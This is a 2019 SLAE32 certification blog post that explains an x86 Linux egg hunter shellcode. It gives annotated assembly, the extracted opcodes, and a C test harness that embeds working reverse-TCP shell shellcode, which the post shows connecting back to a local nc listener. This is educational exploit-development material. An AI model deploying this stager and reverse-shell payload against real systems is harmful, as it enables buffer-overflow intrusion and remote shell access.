---
title: "SLAE32 0x03: Egg Hunter Shellcode"
date: 2019-10-31
category: [SLAE32]
tags: [assembly, exploit development, egg hunter, linux, SLAE32]
header:
    teaser: "/assets/images/slae/eggs.jpg"
---
In the classic stack buffer overflow scenario, execution flow can be redirected to a `JMP ESP` instruction which results in the execution of subsequent shellcode on the stack. Say that the goal is to execute a reverse shell shellcode that is 100 bytes in length. If there are at least 100 bytes worth of buffer space remaining after control of execution flow has been obtained (i.e. after the memory address to which a program should resume execution after a function has completed has been overwritten with a pointer to a `JMP ESP` instruction), then the shellcode will be stored and executed. If, however, there are less than 100 bytes worth of buffer space after control of execution flow has been obtained, then the reverse shell shellcode will not fit in the remaining available buffer space. This is where the "Egg Hunter" technique might come into play.

Imagine a scenario where a program called `chicken` is vulnerable to a stack-based buffer overflow attack. The function within the program that leads to the buffer overflow vulnerability is called `calcium` and takes two arguments; `egghunter` and `eggshell`. The `egghunter` argument can be abused to trigger the overflow vulnerability (i.e. the value of the memory address to which program flow should return upon completion of the `calcium` function can be overwritten using `egghunter` and control of the program can be obtained). After control of the program is gained through this vulnerability, there are only 50 bytes of space remaining in the buffer, so a 100 byte reverse shell shellcode would not fit. The `eggshell` argument of `calcium` cannot be used to trigger a buffer overflow vulnerability, however up to 200 bytes can be written to memory through this argument. Memory for the `egghunter` and `eggshell` arguments are allocated in distinct locations.

Through the functionality of `calcium` in the `chicken` program, a reverse shell shellcode less than 200 bytes in length could be written to memory through the `eggshell` argument and an egg hunter shellcode could be injected into memory and executed via the stack buffer overflow caused by the `egghunter` argument. 

As part of the reverse shell shellcode written to memory via the `eggshell` argument, the shellcode would be prepended by a key. This key is commonly referred to as an "Egg", and is often times 8 bytes in length when implemented in the context of a 32-bit system or process. The 8 byte value that is chosen for the egg is highly unlikely to show up anywhere else in memory by random chance. This means that the shellcode along with the unique egg can be written to memory, however the memory location of this shellcode within virtual address space is unknown.

Using the 50 bytes of buffer space remaining after program control has been obtained via the stack buffer overlow vulnerability caused by the `eggshell` argument, an "Egg Hunter" shellcode would injected and excuted. The egg hunter shellcode would search virtual address space for the unique egg value. Once the the location of the egg is found, a `JMP` instruction can be used to execute the reverse shell shellcode following the egg.

There is a wealth of information available on the subject, and as such, the demo explained below is based primarily off of the work of Matt Miller. Particularly, the majority of the shellcode outlined below is described in his paper, _Safely Searching Process Virtual Address Space_, which can be found [here](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf). The egg hunter shellcode analysis by FuzzySecurity was also a valuable source of information regarding egg hunter techniques, however the analysis is focused heavily on Windows rather than on Linux. The egg hunter shellcode explanation and analysis from FuzzySecurity can be found [here](https://www.fuzzysecurity.com/tutorials/expDev/4.html).

The rest of this post will aim to explain, analyze, and demonstrate an egg hunter shellcode inspired by the work of Matt Miller.

## Objectives
Create a egghunter shellcode that;
1. Create a working demo of the Egg Hunter
2. Egg Hunter should be configurable for different payloads

## Egg Hunter Shellcode
### Explanation
The egg hunter shellcode that will be explained in this section utilizes the `access` system call to search virtual address space for the egg value. The system call number for `access` is decimal `33` which can be determined from the `unistd_32.h` file explained in previous posts. 

```
#define __NR_access 33
```

From `man access`, the `access` function checks whether the calling process can access a filename as specified by a pointer to its location in memory. While `access` expects two arguments, the egg hunter program functionality is provided by and relies only on the first argument. The two arguments expected by `access` are shown below.

```shell
int access(const char *pathname, int mode);
```

If the pointer to the pathname given as argument one points to an area of inaccessible or invalid memory, the `EFAULT` error is returned, as detailed below in `man access`.

```shell
EFAULT pathname points outside your accessible address space.
```

This is crucial to the egg hunter shellcode, as the return value of the `access` systemcall can be examined upon completion to determine whether the egg could possibly be located in the page of memory that includes the specified pointer address. If the `access` system call returns `EFAULT`, then the egg and the subsequent shellcode is not located in the page of memory. When `EFAULT` is returned, `access` is used again to validate a memory address in the next page of memory.

As the egg hunter shellcode does its work, `access` attempts to access a valid memory page which is determined by the absense of the `EFAULT` value returned in `EAX`. When a valid memory page is found, the shellcode continues by first increasing the memory address by one, and then by comparing the egg value specfied within the egg hunter shellcode to the egg value prepended to the target shellcode. That is to say, once a valid memory address is found, the value of the valid memory address is increased by one until either the entire range of memory within the page has been searched without the 8 byte egg being found, or until the 8 byte egg value is found as prepended to the shellcode. If the egg is found within the page, the egg hunter shellcode jumps to the shellcode. Otherwise, the process of locating another valid memory address (on a different page of memory) through the `access` system call is repeated.

The comparision functionality of the egg hunter shellcode is provided by the string comparison instruction `SCASD`. The `SCASD` instruction compares the value in `EAX` (which will be the first 4 bytes of the egg) to the doubleword at `EDI`. In this egg hunter shellcode, a valid memory address as determined by `access` as outlined above will be the target for comparison and will be stored in `EDI` for this purpose. Additionaly, `SCASD` increases the value stored in `EDI` by 4 upon completion and sets status flags which can be used to determine the outcome of the comparison.

Through the general processes explained above, the egg will eventually be found in memory and the shellcode immediately following the egg will be executed.

### Analysis
The egg hunter shellcode will be explained below. The assembly code will come first, followed by an explanation of the instructions.

```nasm
xor edx, edx        ; clear EDX
```

First, the `EDX` register is cleared using the `XOR` instruction. The `XOR` instruction has been explained in a previous post. In general terms, when the `XOR` instruction specifies the same register for both target and destination, the register will be cleared.

```nasm
;sets EDX to PAGE_SIZE-1
align_page:
or dx, 0xfff        ; sets EDX to fff; e.g. 0x0fff, 0x1fff

inc_address:
inc edx             ; increases EDX by one; e.g. 0x1000, 0x2000, 0x2001
```

The instructions above are referenced by two labels. First, the `align_page` label is followed by the `OR DX, 0XFFF` instruction. This results in the `DX` register being set to `fff` which is equal to `4095` in decimal, or `PAGE_SIZE-1`. Since `PAGE_SIZE` is the smallest unit of data for memory management in virtual address space, it can be assumed that the egg and the subsequent shellcode will exist in one memory page. The instruction following the `inc_address` label increases `EDX` by one. This label is used multiple times within the complete shellcode and has dual functionality in the sense that it "turns" the page if the address referenced through `access` is invalid as well as shifts the `SCASD` comparison window by 1 byte when a valid memory page is found.

```nasm
; preparation for SYS_access
; int access(const char *pathname, int mode);
lea ebx, [edx+0x4]  ; pathname
push byte 0x21      ; system call number for access
pop eax             ; 0x21
int 0x80            ; software interrupt; returns 0xfffffff2 on EFAULT
```

Now, the registers are set for the `access` system call. Once the memory page has been aligned, its value is stored in `EDX`. Therefore, the value of `EDX+0x4` is passed as the first argument to `access` through `EBX` with the intention of testing whether the page is a valid range in virtual address space. Next, the system call number for `access` in hexadecimal is pushed to the stack, and immediately removed from the stack and stored in the `EAX` register which specifes the `access` system call to the following software interrupt `INT 0x80`. If the memory address specified in `EBX` is invalid, the `EFAULT` error value is returned in `EAX`.

```nasm
; compare return value of SYS_access to find writable page
cmp al, 0xf2        ; sets ZF when comparison is true
jz align_page       ; jumps to align_page when ZF is set
```

As the return value of `access` is currently in `EAX`, the `CMP` instruction is used to determine whether the checked memory address accessed by `access` is invalid. The `CMP` instruction is used to compare the low-byte value in `AL` to `0xf2` which is the low-byte value for the `EFAULT` error return code. If the value in `AL` is equal to `0xf2`, the comparison returns true and the zero flag `ZF` is set. The `JZ` instruction checks `ZF` and if `ZF` is set, `JZ` jumps to the `align_page` label which in turn increases the memory page (and thus the memory address checked by `access`), resets the registers for `access`, calls the `access` system call, and checks the result once again. This loop will continue until the return value of `access` is not `EFAULT`. 

```nasm
; prepares for egg hunt
mov eax, 0x50905090 ; 4-byte egghunter key
mov edi, edx        ; EDX contains memory address of writable page
```

Once a valid memory address has been located by `access`, the value of the first four bytes of the egg are moved into `EAX`. In this case, the egg is the 8 byte value `\x90\x50\x90\x50\x90\x50\x90\x50`. It is important to note that the first four bytes are identical to the last four bytes. Next, the value in `EDX` is moved to `EDI` which will later be used by `SCASD` for string comparison purposes. The value in `EDX` (and now `EDI`) is the memory address of the first byte within a valid memory page.

```nasm
; hunts for first 4 bytes of egg; scasd sets ZF when match is true
scasd               ; compares [EDI] to value in EAX; increments EDI by 4 
jnz inc_address     ; jumps to inc_address when ZF is not set
```

At this point, `SCASD` is used to compare the contents stored at the memory address referenced in `EDI` (which on the first iteration of the loop would be the first 4 bytes a valid memory page) to the value in `EAX` which is the first four bytes of the egg. If `SCASD` returns true (if the contents at `EDI` match the value in `EAX`), the zero flag `ZF` is set. `SCASD` then increments the value in `EDI` by 4. If the `ZF` is not set, (if `SCASD` returns false), `JNZ` jumps to the `inc_address` label, which will utlimately result in the address used for comparison by `SCASD` in `EDI` to be one memory address higher than the previous iteration. Note that the `access` system call happens each time the `JNZ` condition is met. This allows the loop to continue for all memory addresses in a valid page. Once the memory address is increased to an invalid page, the `access` function will once again return `EFAULT` and the `align_page` loop will be repeated until a new, valid memory page is located.

```nasm
; hunts for last 4 bytes of egg
scasd               ; hunts for last 4 bytes of egg
jnz inc_address
```

Once `SCASD` returns true, (i.e. once the `ZF` flag is set due to the contents at the memory address in `EDI` matches `0x50905090`), the next `SCASD` string comparison occurs in a similar fashion as described previously. This time, since `SCASD` increases `EDI` by 4 upon completion, the contents at `EDI+0x4` are compared to the value in `EAX`. If the contents match, the 8 byte egg has been found. If the contents don't match, egg hunt continues. 

```nasm
; jumps to beginning of shellcode
jmp edi
```

Finally, after the egg is found, the `JMP` instruction is used to redirect execution to the shellcode. Note that the second `SCASD` instruction will result in the memory address that was initially stored in `EDI` to be `EDI+8`. This means that the `JMP EDI` instruction will result in execution continuing beyond the 8 byte egg at the first byte of the shellcode!

## Full Code

```nasm
; egghunter.nasm
; Author: Michael Norris
; Credit: Matt Miller

global _start

section .text
_start:
    xor edx, edx        ; clear EDX

align_page:
    ;sets EDX to PAGE_SIZE-1
    or dx, 0xfff        ; sets EDX to fff; e.g. 0x0fff, 0x1fff

inc_address:
    inc edx             ; increases EDX by one; e.g. 0x1000, 0x2000, 0x2001

    ; preparation for SYS_access
    ; int access(const char *pathname, int mode);
    lea ebx, [edx+0x4]  ; pathname
    push byte 0x21      ; system call number for access
    pop eax             ; 0x21
    int 0x80            ; software interrupt; returns 0xfffffff2 on EFAULT

    ; compare return value of SYS_access to find writable page
    cmp al, 0xf2        ; sets ZF when comparison is true
    jz align_page       ; jumps to align_page when ZF is set

    ; prepares for egg hunt
    mov eax, 0x50905090 ; 4-byte egghunter key
    mov edi, edx        ; EDX contains memory address of writable page
    
    ; hunts for first 4 bytes of egg; scasd sets ZF when match is true
    scasd               ; compares [EDI] to value in EAX; increments EDI by 4 
    jnz inc_address     ; jumps to inc_address when ZF is not set
    
    ; hunts for last 4 bytes of egg
    scasd               ; hunts for last 4 bytes of egg
    jnz inc_address

    ; jumps to beginning of shellcode
    jmp edi
```

## Compile & Test
### Compiling & Examining the Assembly
The egghunter shellcode `egghunter.nasm` is compiled as explained in previous posts. The commands used were run on 64-bit Kali Linux. To start, the code should be assembled with `/usr/bin/nasm` as shown below. As the program is written in x86 assembly, the `elf32` file type is specified using the `-f` flag.

```shell
root@kali:~/workspace/SLAE# nasm -f elf32 egghunter.nasm -o egghunter.o
```

With the code assembled, the next step is to link the `egghunter.o` file with `/usr/bin/ld`. The `-m` flag specifies that the `elf_i386` emulation linker should be used.

```shell
root@kali:~/workspace/SLAE# ld -m elf_i386 egghunter.o -o egghunter
```

As `egghunter` has been compiled and linked, it should now be disassembled into opcodes using `/usr/bin/objdump` for further examination. Using the command shown below, the operation codes can be examined for any `NULL` characters. The output has been truncated to conserve space.

```shell
root@kali:~/workspace/SLAE# objdump -d ./egghunter -M intel

./egghunter:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:       31 d2                   xor    edx,edx

08049002 <align_page>:
 8049002:       66 81 ca ff 0f          or     dx,0xfff

08049007 <inc_address>:
 8049007:       42                      inc    edx
 8049008:       8d 5a 04                lea    ebx,[edx+0x4]
 804900b:       6a 21                   push   0x21
 804900d:       58                      pop    eax
 804900e:       cd 80                   int    0x80
 8049010:       3c f2                   cmp    al,0xf2
 8049012:       74 ee                   je     8049002 <align_page>
 8049014:       b8 90 50 90 50          mov    eax,0x50905090
 8049019:       89 d7                   mov    edi,edx
 804901b:       af                      scas   eax,DWORD PTR es:[edi]
 804901c:       75 e9                   jne    8049007 <inc_address>
 804901e:       af                      scas   eax,DWORD PTR es:[edi]
 804901f:       75 e6                   jne    8049007 <inc_address>
 8049021:       ff e7                   jmp    edi
```

Upon confirmation, the shellcode can be extracted using the bash one-line command outlined in previous posts. The resulting `egghunter` shellcode is shown below.

```shell
\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7
```

### Demonstrating the Egg Hunter
As demonstrated in previous posts, the `sc_test.c` program can be used to test the `egghunter` shellcode. As the Egg Hunter technique is a type of staged payload, the `egghunter` portion cannot be tested without a complementary shellcode that is prepended by the 8-byte egg as explained earlier in this post. With that being said, the `shell_reverse_tcp` reverse shell shellcode from the "Create A Shell_Reverse_TCP Shellcode" paper will be used for this purpose. Additionally, `sc_test.c` has been modified to print the length of the `egghunter` shellcode as well as the length of `shell_reverse_tcp` shellcode prepended with the 8-byte egg.

To test the `egghunter` shellcode with a different payload, simply replace the payload contents below the `/* Current payload: */` comment with the desired shellcode payload. The source code for this file can be found on [GitHub](https://github.com/norrismw/SLAE).

```c
#include <stdio.h>
#include <string.h>

/*
To compile:
gcc -m32 -fno-stack-protector -z execstack sc_test.c -o sc_test
*/

unsigned char egghunter[] = \
    "\x31\xd2\x66\x81\xca\xff\x0f\x42"
    "\x8d\x5a\x04\x6a\x21\x58\xcd\x80"
    "\x3c\xf2\x74\xee\xb8\x90\x50\x90"
    "\x50\x89\xd7\xaf\x75\xe9\xaf\x75"
    "\xe6\xff\xe7";

unsigned char shellcode[] = \
    /* Egg */
    "\x90\x50\x90\x50\x90\x50\x90\x50"
    /* Insert any other payload below */
    /* Current payload: Reverse Shell TCP */
    "\x31\xdb\xf7\xe3\x52\x6a\x01\x6a"
    "\x02\x89\xe1\xfe\xc3\xb0\x66\xcd"
    "\x80\x89\xc3\xbf\xff\xff\xff\xff"
    "\xb9\x80\xff\xff\xfe\x31\xf9\x51"
    "\x66\x68\x11\x5c\x66\x6a\x02\x89"
    "\xe1\x6a\x10\x51\x53\x89\xe1\xb0"
    "\x66\xcd\x80\x89\xd1\xb0\x3f\xcd"
    "\x80\xfe\xc1\xb0\x3f\xcd\x80\xfe"
    "\xc1\xb0\x3f\xcd\x80\x52\x68\x2f"
    "\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    "\x89\xd1\x89\xe3\xb0\x0b\xcd\x80";

int main(void)
{   
    printf("Egghunter Length: %d\n", strlen(egghunter));
    printf("Shellcode Length: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())egghunter;
    ret();
}
```

As explained in the testing of `shell_reverse_tcp`, the same general steps should be taken here to test the `egghunter` shellcode. If the `egghunter` shellcode successfully locates the egg that prepends `shell_reverse_tcp`, a reverse shell will be returned to the listening system on a specified IP address and port. The entire process is outlined again below.

The above program is compiled using the command shown below, as suggested in the commented program code.

```shell
root@kali:~/workspace/SLAE# gcc -m32 -fno-stack-protector -z execstack sc_test.c -o sc_test
```

Before `sc_test` is executed, a `nc` or `ncat` listener should be set up in a seperate terminal window to act as the remote system to which the reverse shell should connect to. 

```shell
root@kali:~/workspace/SLAE# nc -lvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

The default IP address used in the `shell_reverse_tcp` shellcode is `127.0.0.1` and the default listening port is `4444`. Once the listener is configured, running `sc_test` results in a shell on the system, which confirms that the `egghunter` shellcode succesfully located the `shell_reverse_tcp` shellcode prepended by the `\x90\x50\x90\x50\x90\x50\x90\x50` egg.

In the terminal window that runs `sc_test`:

```shell
root@kali:~/workspace/SLAE# ./sc_test
Egghunter Length: 35
Shellcode Length: 96
```

And in the terminal window that runs `nc`:

```shell
root@kali:~/workspace/SLAE# nc -lvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:41410.
ls -lah | grep egghunter
-rwxr-xr-x  1 root root 4.5K Oct 13 22:17 egghunter
-rw-r--r--  1 root root  489 Oct 13 22:17 egghunter.nasm
-rw-r--r--  1 root root  512 Oct 13 22:17 egghunter.o
```

_This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_

<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>

_Student ID: SLAE-1469_

